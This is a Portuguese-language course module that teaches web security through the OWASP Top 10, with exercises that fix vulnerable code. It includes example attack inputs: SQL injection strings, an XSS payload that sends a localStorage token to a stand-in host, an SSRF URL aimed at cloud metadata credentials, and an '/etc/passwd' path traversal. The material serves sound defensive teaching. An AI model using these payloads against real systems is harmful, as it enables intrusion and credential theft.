# 26 · Segurança web e o OWASP Top 10

**Objetivo:** aprender a olhar para o código como quem o quer atacar, conhecer as vulnerabilidades que aparecem em todas as entrevistas (e em todos os relatórios de incidentes), e saber corrigi-las: injeção de SQL, XSS, controlo de acesso partido, SSRF, path traversal, cookies e cabeçalhos.

**Ficheiros para ler:** `src/api/src/repositories/taskRepository.js` (o que este projeto já faz bem), `src/api/src/middleware/errorHandler.js` e `src/api/src/middleware/auth.js`.

**Pré-requisitos:** módulos 01, 03 (SQL), 04 (camadas), 08 (React) e 15 (autenticação).

---

## 1. A mentalidade: todo o input é hostil

Quem programa pensa em como o código **deve** ser usado. Quem ataca pensa em como **pode** ser usado. Um campo "título" foi pensado para receber "Comprar pão"; o atacante vai lá pôr `'; DROP TABLE tasks; --`, um `<script>`, 10 MB de texto, ou o id de uma tarefa de outra pessoa.

Três princípios atravessam o módulo inteiro:

1. **Nunca confies no cliente.** Tudo o que vem do browser (corpo, URL, cabeçalhos, cookies) pode ter sido escrito à mão por quem ataca. A validação no frontend é para a experiência do utilizador; a do servidor é a que conta.
2. **Listas de permitidos, não de proibidos.** "Só aceito `https:`" é seguro; "recuso `javascript:`" esquece-se do `data:`, do `vbscript:`, e do `JaVaScRiPt:`.
3. **Defesa em profundidade.** Várias camadas, porque cada uma vai falhar um dia: queries parametrizadas **e** um utilizador da BD com permissões mínimas; escapar o HTML **e** uma Content-Security-Policy.

## 2. O OWASP Top 10

A **OWASP** (Open Worldwide Application Security Project) é uma fundação sem fins lucrativos que publica, de poucos em poucos anos, a lista das dez categorias de vulnerabilidades mais graves em aplicações web, com base em dados reais. É a referência que todas as empresas usam, e o vocabulário que esperam que conheças.

A edição de 2021 é a que vais encontrar na maior parte dos materiais:

| # | Categoria | Exemplo | Neste módulo |
|---|---|---|---|
| A01 | Controlo de acesso partido | ver a fatura de outro cliente mudando o id no URL | §5, P3 |
| A02 | Falhas criptográficas | passwords guardadas com MD5; HTTP sem TLS | §8, módulo 15 |
| A03 | Injeção (SQL, comandos, XSS) | `' OR 1=1 --` num campo de pesquisa | §3, §4, P1, P2 |
| A04 | Design inseguro | recuperação de password por "pergunta secreta" | §1 |
| A05 | Má configuração | stack traces visíveis, password `admin/admin` | §9, P5 |
| A06 | Componentes vulneráveis | uma dependência npm com uma falha conhecida | §10 |
| A07 | Falhas de autenticação | login sem limite de tentativas | §8, P5 |
| A08 | Falhas de integridade | um script de uma CDN alterado por terceiros | §10 |
| A09 | Falhas de registo e monitorização | ninguém repara em 10 000 logins falhados | §11 |
| A10 | Server-Side Request Forgery | o servidor descarrega um URL interno a pedido do atacante | §7, P4 |

Em 2025 saiu uma nova edição, que reordena as categorias e dá mais destaque à cadeia de fornecimento (as dependências) e ao tratamento de erros. Os números mudam; os conceitos são os mesmos.

## 3. Injeção de SQL

O ataque mais antigo e ainda dos mais comuns. Acontece quando o input do utilizador é **colado** dentro do SQL:

```js
// VULNERÁVEL
db.query(`SELECT * FROM notas WHERE dono = ${dono} AND titulo ILIKE '%${texto}%'`);
```

Com `texto = "' OR dono = 2 --"`, o SQL que chega ao Postgres é:

```sql
SELECT * FROM notas WHERE dono = 1 AND titulo ILIKE '%' OR dono = 2 --%'
```

O `'` fecha a string, o `OR dono = 2` muda a lógica e o `--` transforma o resto num comentário. Com um `UNION SELECT`, o atacante lê **outras tabelas** (os hashes das passwords). Em bases de dados que aceitam várias instruções numa query, apaga-as.

A correção são as **queries parametrizadas**: o SQL e os valores viajam **separados**, e o Postgres nunca interpreta os valores como código:

```js
db.query('SELECT * FROM notas WHERE dono = $1 AND titulo ILIKE $2', [dono, `%${texto}%`]);
```

Abre o `src/api/src/repositories/taskRepository.js`: **todas** as queries do projeto usam `$1`, `$2`. O módulo 03 já to tinha mostrado; este módulo mostra-te porquê.

Duas armadilhas:

- **Nomes de colunas e tabelas não podem ser parâmetros.** `ORDER BY $1` não ordena por coluna nenhuma. Quando o utilizador escolhe a ordenação, valida o valor contra uma **lista de permitidos** (`titulo`, `criada_em`) e só depois o metes no SQL.
- **Os ORMs não te protegem de tudo.** O Prisma, o Hibernate e o Entity Framework parametrizam por ti, mas todos têm uma forma de escrever SQL "cru" (`$queryRawUnsafe`, `createNativeQuery`, `FromSqlRaw`), e é aí que a injeção volta.

O mesmo problema existe com **comandos do sistema** (`exec(\`convert ${ficheiro} ...\`)`): usa `execFile` com uma lista de argumentos, nunca uma string montada à mão.

## 4. Cross-Site Scripting (XSS)

A injeção de SQL ataca o servidor. O **XSS** ataca **os outros utilizadores**: o atacante consegue pôr JavaScript seu numa página que outras pessoas abrem, e esse script corre com as permissões delas (lê o token, faz pedidos em nome delas).

```js
// VULNERÁVEL: o comentário vem da BD, escrito por qualquer pessoa
html += `<p>${comentario.texto}</p>`;
// texto = "<img src=x onerror=fetch('https://mau.pt/?t='+localStorage.token)>"
```

| Tipo | De onde vem o script |
|---|---|
| **Guardado** (*stored*) | da BD: um comentário, um nome de utilizador. Atinge toda a gente que vê a página. |
| **Refletido** | do próprio pedido: `/pesquisa?q=<script>...`, num link enviado à vítima |
| **Baseado no DOM** | o JavaScript do frontend mete input no DOM (`innerHTML = location.hash`) |

A correção é **escapar** o texto conforme o sítio onde vai parar. Dentro de HTML, os cinco caracteres especiais (`& < > " '`) passam a entidades (`&lt;` e companhia), e o browser mostra-os em vez de os interpretar. Nos atributos `href`, escapar não basta: `javascript:alert(1)` não tem nenhum carácter especial. Aí é preciso uma lista de permitidos de protocolos.

**E o React?** O React escapa tudo o que metes entre chavetas (`<p>{texto}</p>`), por isso o frontend deste projeto está protegido por omissão. Há duas exceções, que deves tratar como sinais de alarme numa revisão de código: `dangerouslySetInnerHTML` e `href={urlDoUtilizador}` (o React avisa sobre `javascript:` na consola, mas não o bloqueia em todas as versões).

A segunda camada é a **Content-Security-Policy** (§9): mesmo que um script entre na página, o browser recusa executá-lo se não vier de uma origem permitida.

## 5. Controlo de acesso partido: o n.º 1 da lista

Autenticação é saber **quem** és. Autorização é saber **o que podes fazer**. A falha mais comum na web não é técnica, é esquecer a segunda:

```js
// VULNERÁVEL: confirma que estás autenticado, mas não que a nota é tua
app.get('/notas/:id', autenticado, (req, res) => res.json(notas.find((n) => n.id == req.params.id)));
```

A Ana abre `/notas/7` (a sua), muda para `/notas/8` e lê a nota do Bruno. Chama-se **IDOR** (*Insecure Direct Object Reference*), e já expôs faturas, receitas médicas e mensagens privadas em empresas grandes. Gerar ids aleatórios (UUIDs) dificulta adivinhá-los, mas **não é** a correção: os ids aparecem em URLs, logs e partilhas. A correção é verificar a posse **em cada pedido, no servidor**:

```sql
SELECT ... FROM tasks WHERE id = $1 AND user_id = $2
```

É exatamente o que o `taskRepository.js` deste projeto faz em todas as queries.

Duas decisões que valem a pena discutir numa entrevista:

- **404 ou 403?** Um 403 diz "isto existe, mas não é teu", e assim o atacante descobre que ids existem. Um 404 para "não existe" e para "não é teu" não revela nada.
- **Mass assignment:** `Object.assign(nota, req.body)` aceita **todos** os campos do corpo, incluindo os que o formulário não mostra: `{"dono": "eu"}`, `{"admin": true}`. A correção é uma lista de campos editáveis (ou um schema, como o Zod do módulo 04, que rejeita campos desconhecidos).

## 6. Cookies, CSRF e onde guardar o token

Se a sessão vive numa **cookie**, o browser envia-a sozinho em todos os pedidos para o teu domínio, mesmo os que partem de **outro site**. Um site malicioso pode ter um formulário escondido que faz `POST https://banco.pt/transferir`, e o browser da vítima envia a cookie dela. Isto é o **CSRF** (*Cross-Site Request Forgery*).

As defesas modernas estão nos atributos da cookie:

```
Set-Cookie: sessao=abc; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
```

| Atributo | Protege contra |
|---|---|
| `HttpOnly` | o JavaScript da página não consegue ler a cookie: um XSS não a rouba |
| `Secure` | só é enviada por HTTPS |
| `SameSite=Lax` | não é enviada em pedidos `POST` (nem em `fetch`) vindos de outros sites: trava o CSRF |
| `Max-Age` | expira sozinha |

Este projeto não usa cookies: o frontend guarda o JWT e envia-o no cabeçalho `Authorization: Bearer`. O browser não envia esse cabeçalho sozinho, por isso **não há CSRF**. Em troca, o token fica acessível ao JavaScript: um XSS consegue lê-lo. Nenhuma opção é perfeita. Hoje, a recomendação mais comum para aplicações web é a cookie `HttpOnly` + `SameSite`, ou o padrão BFF (*backend for frontend*) do módulo 15, em que o token nunca chega ao browser.

## 7. SSRF e path traversal: quando o utilizador escolhe o destino

**SSRF** (*Server-Side Request Forgery*): a app tem uma função "pré-visualizar link" que descarrega o URL que o utilizador escreve. O atacante escreve `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. Esse endereço só existe **dentro** da cloud: é o serviço de metadados da AWS, que entrega credenciais temporárias à máquina. O servidor descarrega-as e mostra-as ao atacante. Foi exatamente assim o roubo de dados da Capital One em 2019 (dados de mais de 100 milhões de pessoas).

As defesas, por camadas:

1. **Lista de permitidos** de protocolos (`https:`) e, se possível, de domínios.
2. **Recusar destinos internos:** `localhost`, `127.0.0.0/8`, as redes privadas (`10/8`, `172.16/12`, `192.168/16`), `169.254/16`, `::1`.
3. **Verificar o IP depois de resolver o DNS.** Um domínio público pode resolver para `127.0.0.1` (é o ataque de *DNS rebinding*), e uma verificação só do texto do URL não o apanha. O P4 fica pelo texto; um sistema a sério resolve o nome, verifica o IP, e liga-se a **esse** IP.
4. **Na infraestrutura:** o IMDSv2 da AWS exige um token que um simples GET não tem, e a rede pode bloquear a saída do servidor para endereços internos.

**Path traversal:** a app serve anexos com `readFile(join('anexos', nome))`. O atacante pede `nome = '../../../etc/passwd'`. A correção é resolver o caminho completo (`path.resolve`, que aplica os `..`) e confirmar que ainda começa pela pasta permitida **mais o separador**. Sem o separador, `/srv/anexos-privados` passaria por estar dentro de `/srv/anexos`.

## 8. Autenticação e criptografia

O módulo 15 trata disto em detalhe. As regras que aparecem sempre:

- **Passwords:** nunca em texto simples, nunca com MD5 ou SHA-256 simples (são rápidos, e quem rouba a BD testa milhares de milhões por segundo). Usa funções **lentas de propósito**: bcrypt, scrypt ou Argon2. O projeto usa bcrypt.
- **Limitar tentativas** de login por IP e por conta (o rate limiter do módulo 05, prática P2). Sem isto, um atacante testa as 10 000 passwords mais comuns contra cada email.
- **Comparações em tempo constante:** `token === recebido` pára no primeiro carácter diferente, e quem mede milhões de tempos de resposta consegue adivinhar o token carácter a carácter. Para segredos, usa `crypto.timingSafeEqual`.
- **Mensagens iguais** para "email não existe" e "password errada", para não revelares que emails têm conta.
- **TLS em todo o lado**, e o cabeçalho HSTS (§9) para o browser nunca tentar HTTP.

## 9. Má configuração e cabeçalhos de segurança

Muitas falhas não estão no teu código, mas na forma como ele está configurado:

- **Mensagens de erro com detalhes internos** (stack traces, SQL): o `errorHandler.js` deste projeto devolve só `"Erro interno"` nos 500 e regista o detalhe no log. É o correto.
- **Credenciais por omissão:** o Keycloak deste projeto tem `admin/admin` e o RabbitMQ `workshop/workshop`. São aceitáveis em desenvolvimento, e os ficheiros dizem-no. Em produção, é das primeiras coisas que um atacante experimenta.
- **CORS demasiado aberto:** `Access-Control-Allow-Origin: *` com credenciais. O módulo 10 mostra como este projeto evita o CORS de todo, servindo tudo pela mesma origem.
- **Cabeçalhos HTTP que o browser respeita:**

| Cabeçalho | Efeito |
|---|---|
| `Content-Security-Policy: default-src 'self'` | o browser só executa scripts e carrega recursos da tua origem: um XSS que tente carregar um script de fora é bloqueado |
| `frame-ancestors 'none'` (dentro do CSP) | ninguém consegue pôr a tua página num `<iframe>`: trava o *clickjacking* |
| `X-Content-Type-Options: nosniff` | o browser respeita o `Content-Type`, sem "adivinhar" que um ficheiro de texto é HTML |
| `Strict-Transport-Security` | durante o tempo indicado, o browser só abre o teu domínio por HTTPS |
| `Referrer-Policy: no-referrer` | os sites para onde fazes links não ficam a saber de que página vieste (que pode ter um token no URL) |
| sem `X-Powered-By` | não anuncias que usas Express (e que versão) a quem procura alvos |

Em Express, o pacote `helmet` aplica um conjunto sensato destes cabeçalhos com uma linha. No P5 escreves o teu à mão, para perceberes o que ele faz. A API deste projeto ainda não o usa: é o exercício D7 do módulo 12.

## 10. Dependências e cadeia de fornecimento

Um `npm install` de uma app React traz centenas de pacotes, escritos por milhares de pessoas. Qualquer um pode ter uma vulnerabilidade conhecida, ou ser comprometido de propósito (houve casos reais de pacotes populares alterados para roubar credenciais).

- **`npm audit`** (e o Dependabot, no GitHub) avisa quando uma dependência tem uma vulnerabilidade publicada (um **CVE**).
- O **lock file** fixa as versões exatas e os seus hashes: um `npm ci` instala exatamente o que foi revisto.
- Cuidado com o *typosquatting*: `expres` em vez de `express`. Lê o nome antes de instalares.
- O **Trivy** e o `docker scout` fazem o mesmo às imagens Docker (o sistema operativo da imagem também tem pacotes com falhas).

## 11. Registar e detetar

Um ataque que ninguém vê dura meses. Regista os eventos de segurança: logins falhados, acessos negados (os 404 de IDOR em sequência são um sinal), alterações de permissões. E **nunca** registes passwords, tokens ou números de cartão: os logs são lidos por muito mais gente do que a BD. Com as métricas do módulo 19, um alerta para "mais de 100 logins falhados por minuto" apanha um ataque de força bruta enquanto acontece.

## 12. Ferramentas que vais ver numa empresa

| Tipo | O que faz | Exemplos |
|---|---|---|
| **SAST** (análise estática) | lê o código à procura de padrões perigosos | Semgrep, CodeQL (grátis no GitHub), SonarQube |
| **DAST** (análise dinâmica) | ataca a app a correr, de fora | OWASP ZAP, Burp Suite |
| **SCA** (dependências) | procura CVEs nas dependências | `npm audit`, Dependabot, Snyk, Trivy |
| **Segredos** | procura chaves e passwords no código e no histórico do Git | gitleaks, GitHub secret scanning |

E, antes de escrever código, a **modelação de ameaças**: olhar para o diagrama da arquitetura (módulo 00) e perguntar, para cada seta, "e se alguém mentir aqui?". Muitas empresas usam a lista STRIDE como guia: Spoofing, Tampering, Repudiation, Information disclosure, Denial of service e Elevation of privilege.

---

## Prática: escreve tu

Nesta prática, o código **já existe e funciona**, mas é vulnerável. O teu trabalho é corrigi-lo. Cada ficheiro de teste tem dois tipos de testes:

- **uso normal**, que já passam e têm de **continuar** a passar (não vale "corrigir" apagando a funcionalidade);
- **ataques**, que neste momento têm sucesso. Quando os corrigires, falham, e o teste passa.

**Ficheiros:** `pratica/26-seguranca-owasp/` (`injecao.js`, `xss.js`, `controloAcesso.js`, `ficheirosEUrls.js`, `cabecalhos.js`)

**Verificar:** `npm run verificar 26` (dentro de `pratica/`). Só um exercício: `npm run verificar 26 injecao`, `... 26 xss`, `... 26 controlo`, `... 26 ficheiros` ou `... 26 cabecalhos`.

Antes de corrigires cada um, **lê o teste de ataque** e percebe por que é que o código atual cai. Se conseguires explicar o ataque a outra pessoa, a correção é a parte fácil.

Se nunca usaste a prática, lê primeiro a introdução no [módulo 01](01-fundamentos.md#prática-escreve-tu).

### P1 · Injeção de SQL (≈25 min)

**Ficheiro:** `injecao.js`

Uma pesquisa de notas que cola o texto, o dono e a ordenação dentro do SQL. Os ataques leem as notas de outro dono, os hashes das passwords (com `UNION SELECT`) e tentam um `DROP TABLE` pela ordenação. Os testes correm contra um Postgres a sério (PGlite).

**Sintaxe que vais praticar:** parâmetros `$1`/`$2` com um array de valores, concatenação em SQL (`'%' || $2 || '%'`), `Set` como lista de permitidos.

<details>
<summary>Pista</summary>

O `%` do `ILIKE` pode ir no próprio valor (`` `%${texto}%` ``) ou ser juntado no SQL com o operador `||`. Para a ordenação, um `Set` com os nomes permitidos e um `.has()`: se não estiver lá, lança o erro **antes** de montares a query.
</details>

<details>
<summary>Solução de referência</summary>

```js
// Os nomes de colunas não podem ser parâmetros: por isso, só se aceitam os desta lista.
const ORDENAVEIS = new Set(['titulo', 'criada_em']);

export async function procurarNotas(db, { dono, texto = '', ordenar = 'criada_em' }) {
  if (!ORDENAVEIS.has(ordenar)) {
    throw new Error(`ordenar inválido: "${ordenar}" (aceito: ${[...ORDENAVEIS].join(', ')})`);
  }
  // Os valores vão À PARTE ($1, $2): o Postgres nunca os lê como SQL, sejam eles o que forem.
  const sql = `
    SELECT id, titulo FROM notas
    WHERE dono = $1 AND titulo ILIKE '%' || $2 || '%'
    ORDER BY ${ordenar}, id`;
  const { rows } = await db.query(sql, [dono, texto]);
  return rows;
}
```
</details>

### P2 · XSS (≈20 min)

**Ficheiro:** `xss.js`

Uma função que gera o HTML de um comentário. Os ataques metem um `<script>` no texto, um `<img onerror>` no autor, aspas no link para acrescentar um atributo, e links `javascript:` (em várias grafias).

**Sintaxe que vais praticar:** `String.prototype.replace` com uma regex global e uma função, um objeto como tabela de tradução, regex com a flag `i`.

<details>
<summary>Pista</summary>

Com cinco `replace()` seguidos, a ordem importa: se trocares o `<` por `&lt;` primeiro e o `&` depois, o `&lt;` passa a `&amp;lt;`. Com um único `replace(/[&<>"']/g, ...)`, cada carácter é visto uma só vez e o problema desaparece. Para o link, pergunta "começa por `http://` ou `https://`?", em vez de "contém `javascript`?".
</details>

<details>
<summary>Solução de referência</summary>

```js
const ENTIDADES = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };

// Um único replace com uma regex: cada carácter é trocado uma só vez, por isso a ordem nem importa.
// (Com cinco replace() seguidos, o & teria de ser o primeiro, senão o &lt; virava &amp;lt;.)
export function escaparHtml(texto) {
  return String(texto).replace(/[&<>"']/g, (c) => ENTIDADES[c]);
}

// Só links web. Tudo o resto (javascript:, data:, vbscript:...) fica de fora: lista de permitidos.
const linkSeguro = (site) => typeof site === 'string' && /^https?:\/\//i.test(site);

export function renderizarComentario({ autor, texto, site }) {
  const nome = linkSeguro(site) ? `<a href="${escaparHtml(site)}">${escaparHtml(autor)}</a>` : escaparHtml(autor);
  return `<article class="comentario"><h3>${nome}</h3><p>${escaparHtml(texto)}</p></article>`;
}
```
</details>

### P3 · IDOR e mass assignment (≈25 min)

**Ficheiro:** `controloAcesso.js`

Uma API Express de notas, com a autenticação (simplificada) já feita. Os ataques: ler e alterar a nota de outra pessoa mudando o id, mudar o dono de uma nota pelo corpo do PATCH, e distinguir uma nota "de outra pessoa" de uma "que não existe".

**Sintaxe que vais praticar:** uma função de autorização reutilizada pelas rotas, `Array.prototype.find` com duas condições, uma lista de campos permitidos com `for...of` e o operador `in`.

<details>
<summary>Pista</summary>

Escreve **uma** função `minhaNota(req)` que procura a nota pelo id **e** pelo dono, e usa-a nas duas rotas. A autorização num sítio só é mais difícil de esquecer numa rota nova. No PATCH, em vez de `Object.assign`, copia só os campos de uma lista.
</details>

<details>
<summary>Solução de referência</summary>

```js
import express from 'express';

// Os únicos campos que o cliente pode mudar. Tudo o resto do corpo é ignorado.
const EDITAVEIS = ['titulo', 'texto'];

export function criarApp(notas) {
  const app = express();
  app.use(express.json());

  app.use((req, res, next) => {
    req.utilizador = req.get('X-Utilizador');
    if (!req.utilizador) return res.status(401).json({ error: 'não autenticado' });
    next();
  });

  // A autorização vive num sítio só: "a nota existe E é tua". Não existir e não ser tua dão a
  // mesma resposta (404), para quem ataca não conseguir descobrir que ids existem.
  const minhaNota = (req) => notas.find((n) => n.id === Number(req.params.id) && n.dono === req.utilizador);

  app.get('/notas', (req, res) => {
    res.json(notas.filter((n) => n.dono === req.utilizador));
  });

  app.get('/notas/:id', (req, res) => {
    const nota = minhaNota(req);
    if (!nota) return res.status(404).json({ error: 'não encontrada' });
    res.json(nota);
  });

  app.patch('/notas/:id', (req, res) => {
    const nota = minhaNota(req);
    if (!nota) return res.status(404).json({ error: 'não encontrada' });
    for (const campo of EDITAVEIS) {
      if (campo in req.body) nota[campo] = req.body[campo];
    }
    res.json(nota);
  });

  return app;
}
```
</details>

### P4 · Path traversal e SSRF (≈30 min)

**Ficheiro:** `ficheirosEUrls.js`

Duas funções que recebem um destino escolhido pelo utilizador: um nome de anexo e um URL para pré-visualizar. Os ataques saem da pasta com `../` e caminhos absolutos, e apontam o servidor para `localhost`, para as redes privadas e para o endereço de metadados da cloud.

**Sintaxe que vais praticar:** `path.resolve` e `path.sep`, `new URL()` dentro de `try/catch`, `url.protocol` e `url.hostname`, regex com âncoras e alternativas (`^172\.(1[6-9]|2\d|3[01])\.`).

<details>
<summary>Pista</summary>

O teste exige que o erro seja **teu**, e não um `ENOENT`. Um `ENOENT` quer dizer que o código chegou a tentar abrir o caminho perigoso; a verificação tem de vir **antes** do `readFile`. Para os IPs, o objeto `URL` já normaliza o nome do host (põe-no em minúsculas), por isso compara com `url.hostname`, e não com o texto original. O `172.16.0.0/12` vai de `172.16` a `172.31`: o `172.32` já é público.
</details>

<details>
<summary>Solução de referência</summary>

```js
import { readFile } from 'node:fs/promises';
import { resolve, sep } from 'node:path';

export async function lerAnexo(pasta, nome) {
  const base = resolve(pasta);
  // resolve() aplica os ".." e os caminhos absolutos: o resultado é o caminho REAL que seria aberto.
  const caminho = resolve(base, nome);
  // base + sep: sem o separador, "/x/anexos-privados" passaria por começar com "/x/anexos".
  if (!caminho.startsWith(base + sep)) {
    throw new Error(`anexo fora da pasta permitida: "${nome}"`);
  }
  return readFile(caminho, 'utf8');
}

// Redes privadas e especiais (RFC 1918, loopback, link-local, "esta rede").
const IPV4_INTERNO = [
  /^127\./,
  /^10\./,
  /^172\.(1[6-9]|2\d|3[01])\./,
  /^192\.168\./,
  /^169\.254\./,
  /^0\./,
];

export function validarUrlExterna(texto) {
  let url;
  try {
    url = new URL(texto);
  } catch {
    throw new Error(`URL inválido: "${texto}"`);
  }
  if (url.protocol !== 'https:') throw new Error(`URL recusado: só https (veio ${url.protocol})`);
  const host = url.hostname.toLowerCase(); // o URL já normaliza (ex.: LOCALHOST → localhost)
  if (host === 'localhost' || host === '[::1]' || IPV4_INTERNO.some((r) => r.test(host))) {
    throw new Error(`URL recusado: aponta para a rede interna (${host})`);
  }
  return url;
}
```

Esta verificação olha só para o **texto** do URL. Como diz a secção 7, um sistema a sério também verifica o IP depois de resolver o DNS, porque um domínio público pode apontar para `127.0.0.1`.
</details>

### P5 · Cabeçalhos, comparação em tempo constante e cookies (≈20 min)

**Ficheiro:** `cabecalhos.js`

Um middleware com os cabeçalhos da secção 9, uma comparação de tokens que não deixa fugir informação pelo tempo de resposta, e a cookie de sessão com todas as proteções da secção 6.

**Sintaxe que vais praticar:** um middleware que devolve uma função (`(req, res, next) => ...`), `res.set({...})` e `res.removeHeader`, `Buffer.from`, `crypto.timingSafeEqual`.

<details>
<summary>Pista</summary>

O Express acrescenta o `X-Powered-By` num middleware interno que corre **antes** dos teus, por isso, quando o teu corre, o cabeçalho já lá está e podes removê-lo. (A alternativa é `app.disable('x-powered-by')`, mas aqui só tens acesso ao middleware.) O `timingSafeEqual` compara `Buffer`s, não strings.
</details>

<details>
<summary>Solução de referência</summary>

```js
import { timingSafeEqual } from 'node:crypto';

export function cabecalhosSeguranca() {
  return (req, res, next) => {
    res.removeHeader('X-Powered-By');
    res.set({
      // Só carrega scripts, estilos e imagens da própria origem; ninguém pode pôr a página num iframe.
      'Content-Security-Policy': "default-src 'self'; frame-ancestors 'none'",
      // O browser não "adivinha" o tipo: um .txt com HTML lá dentro não é tratado como HTML.
      'X-Content-Type-Options': 'nosniff',
      // Os links para outros sites não lhes dizem de que página vieste.
      'Referrer-Policy': 'no-referrer',
      // Durante um ano, este domínio só é aberto por HTTPS, mesmo que alguém escreva http://.
      'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
    });
    next();
  };
}

export function tokensIguais(a, b) {
  const x = Buffer.from(a);
  const y = Buffer.from(b);
  // O tamanho não é segredo (e o timingSafeEqual exige tamanhos iguais).
  if (x.length !== y.length) return false;
  return timingSafeEqual(x, y);
}

export function cookieSessao(valor) {
  return `sessao=${valor}; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600`;
}
```

Um pormenor que os testes revelaram: a página 404 por omissão do Express **limpa** os cabeçalhos que puseste e põe os seus, com um CSP ainda mais apertado (`default-src 'none'`). Por isso os testes verificam duas rotas a sério.
</details>

## Experiências

Com a stack do workshop a correr (`docker compose -f config/docker-compose.yml up -d`), e um token teu (faz login no frontend e copia-o do `localStorage`, ou usa o `scripts/smoke-test.sh` como exemplo).

1. **IDOR no projeto:** cria duas contas, uma tarefa em cada, e tenta marcar como feita a tarefa da segunda conta com o token da primeira: `curl -i -X PATCH -H "Authorization: Bearer <token-da-1>" -H "Content-Type: application/json" -d '{"done":true}' http://localhost:8080/api/tasks/<id-da-2>`. Que código recebes? Encontra no `taskRepository.js` a linha que te protege.
2. **Injeção que não entra:** cria uma tarefa com o título `'); DROP TABLE tasks; --`. Abre-a no frontend e confirma no `psql` que está guardada **tal e qual**, como texto. É o `$1` a trabalhar.
3. **Os cabeçalhos do projeto:** `curl -sI http://localhost:8080/api/health`. Que cabeçalhos da secção 9 faltam? Repara no `X-Powered-By: Express`.
4. **Dependências:** `cd src/api && npm audit`. Se aparecer alguma vulnerabilidade, lê o aviso: em que pacote, que gravidade, e se é uma dependência direta ou de uma dependência.

## Perguntas de pensamento crítico

1. Um colega diz: "não precisamos de verificar o dono da nota no servidor, porque o frontend só mostra as notas do utilizador". O que lhe respondes?
2. Porque é que uma lista de proibidos (`if (url.includes('localhost'))`) é uma má defesa contra SSRF? Dá dois URLs que a contornariam.
3. A API deste projeto guarda o JWT no `localStorage` do browser. Que tipo de ataque isso evita, que tipo de ataque torna mais grave, e o que mudarias numa aplicação bancária?

<details>
<summary>Respostas</summary>

1. Que o frontend é só um dos clientes possíveis: qualquer pessoa pode fazer pedidos à API com o `curl`, com as ferramentas do browser, ou com um script, e mudar o id no URL. A autorização tem de estar onde o atacante não chega, no servidor, em cada pedido. O que o frontend mostra é uma questão de experiência de utilizador, não de segurança.
2. Porque há infinitas formas de escrever o mesmo destino, e uma lista de proibidos só apanha as que te lembraste. Exemplos: `https://127.0.0.1/` e `https://[::1]/` não contêm "localhost"; `https://2130706433/` é `127.0.0.1` escrito como um número; e um domínio teu que resolve para `127.0.0.1` passa qualquer verificação de texto. Uma lista de permitidos (só `https:`, e só IPs públicos depois de resolver o DNS) não depende da imaginação de quem a escreveu.
3. Evita o CSRF: o browser não envia o cabeçalho `Authorization` sozinho a partir de outros sites. Torna o XSS mais grave: qualquer script que entre na página lê o token e pode usá-lo de outra máquina, até expirar. Numa aplicação bancária, o token ficaria numa cookie `HttpOnly; Secure; SameSite=Strict` (ou não chegaria de todo ao browser, com o padrão BFF), com uma CSP apertada, tokens de vida curta, e confirmação adicional (MFA) para as operações sensíveis.
</details>

<!-- quiz:start -->

## Quiz rápido (autoavaliação)

Perguntas específicas deste módulo. Responde primeiro sem espiar a resposta. Versão interativa e corrigida automaticamente: `node scripts/quiz.mjs 26`.

**1.** Qual é a correção certa para a injeção de SQL num campo de pesquisa?

- a) Remover as plicas do texto antes de o colar no SQL
- b) Queries parametrizadas ($1, $2): o SQL e os valores viajam separados e os valores nunca são lidos como código
- c) Limitar o texto a 50 caracteres
- d) Validar o texto no frontend

<details><summary>Resposta</summary>

**b) Queries parametrizadas ($1, $2): o SQL e os valores viajam separados e os valores nunca são lidos como código** — Filtrar caracteres é uma lista de proibidos que alguém acaba por contornar. Para nomes de colunas (ORDER BY), que não podem ser parâmetros, usa-se uma lista de permitidos.

</details>

**2.** A Ana muda o id no URL (/notas/7 → /notas/8) e lê a nota do Bruno. Como se chama esta falha?

- a) XSS
- b) CSRF
- c) IDOR (controlo de acesso partido)
- d) SSRF

<details><summary>Resposta</summary>

**c) IDOR (controlo de acesso partido)** — Insecure Direct Object Reference. A correção é verificar a posse em cada pedido, no servidor (WHERE id = $1 AND user_id = $2), e não esconder os ids.

</details>

**3.** Porque é que responder 404 (e não 403) a quem pede a nota de outra pessoa é uma boa ideia?

- a) Porque 403 não existe em HTTP
- b) Porque assim a resposta é igual à de uma nota inexistente, e o atacante não descobre que ids existem
- c) Porque 404 é mais rápido
- d) Porque o browser repete os pedidos 403

<details><summary>Resposta</summary>

**b) Porque assim a resposta é igual à de uma nota inexistente, e o atacante não descobre que ids existem** — Um 403 confirma que o recurso existe. A diferença entre 'não existe' e 'não é teu' é informação útil a quem ataca.

</details>

**4.** Que atributo de uma cookie impede o JavaScript da página de a ler (e um XSS de a roubar)?

<details><summary>Resposta</summary>

**httponly** — Junto com Secure e SameSite=Lax, é a configuração recomendada para cookies de sessão.

</details>

**5.** Que endereço é o alvo clássico de um ataque SSRF numa cloud, porque entrega credenciais à máquina?

- a) 127.0.0.1:3000
- b) 169.254.169.254 (o serviço de metadados)
- c) 8.8.8.8
- d) 10.0.0.1

<details><summary>Resposta</summary>

**b) 169.254.169.254 (o serviço de metadados)** — Foi o caso da Capital One em 2019. Defesas: lista de permitidos, recusar redes internas depois de resolver o DNS, e o IMDSv2 na AWS.

</details>

<!-- quiz:end -->
